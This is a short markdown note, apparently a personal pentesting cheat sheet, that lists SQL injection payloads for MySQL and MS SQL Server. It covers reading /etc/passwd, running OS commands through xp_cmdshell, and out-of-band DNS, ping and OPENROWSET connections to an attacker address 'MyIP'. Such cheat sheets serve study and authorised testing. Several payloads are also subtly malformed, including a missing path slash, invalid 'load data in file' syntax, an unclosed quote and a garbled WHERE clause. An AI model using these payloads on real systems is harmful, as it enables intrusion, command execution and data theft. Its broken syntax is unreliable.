---
date: 2024-11-02T15:49
tags:
  - "#cybersecurity"
  - "#web-security"
  - "#SQLi"
  - "#injection"
cssclasses:
  - pen-green
  - page-grid
---
#### File System interaction
***
**MySQL**
- Load file: `' UNION SELECT 1, load_file('etc/passwd'), 1, 1, 1;`
- Load data in file:
	- `create table temp ( line blob );`
	- load data in file: `/etc/passwd into table temp`
	- `SELECT * FROM temp`
- Select into outfile

**MS SQL Server**
- `'; exec master.xp_cmdshell 'ipconfig > test.txt'`
- `'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt'`
- `'; begin declare @data varchar(8000); set @data ='| '; select @data=@data+txt+'|' from tmp where txt@data; select @data as x into temp end --`

#### OS Interaction Examples
***
**Reverse DNS:** `'; exec master.xp_cmdshell 'nslookup a.com MyIP`

**Reverse pings:** `'; exec master.xp_cmdshell 'ping MyIP'`

**OPENROWSET:** `'; select * from OPENROWSET('SQLoledb', 'uid=sa; pwd=Pass123; Network=DBMSSOCN; Address=MyIP,80;', 'select * from table')`